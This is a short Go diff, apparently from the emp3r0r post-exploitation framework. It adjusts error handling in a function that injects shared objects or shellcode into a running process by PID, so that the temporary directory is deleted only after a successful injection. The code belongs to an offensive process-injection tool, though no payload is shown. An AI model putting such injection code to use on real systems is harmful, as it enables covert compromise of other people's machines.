@@ -355,9 +355,11 @@ func InjectorHandler(pid int, method string) (err error) {
 			return
 		}
 		err = GDBInjectSO(pid)
-		err = os.RemoveAll("/tmp/emp3r0r")
-		if err != nil {
-			return
+		if err == nil {
+			err = os.RemoveAll("/tmp/emp3r0r")
+			if err != nil {
+				return
+			}
 		}
 	case "inject_shellcode":
 		shellcode, _ := prepare_sc()
@@ -374,9 +376,11 @@ func InjectorHandler(pid int, method string) (err error) {
 			return
 		}
 		err = InjectSO(pid)
-		err = os.RemoveAll("/tmp/emp3r0r")
-		if err != nil {
-			return
+		if err == nil {
+			err = os.RemoveAll("/tmp/emp3r0r")
+			if err != nil {
+				return
+			}
 		}
 	default:
 		err = fmt.Errorf("%s is not supported", method)
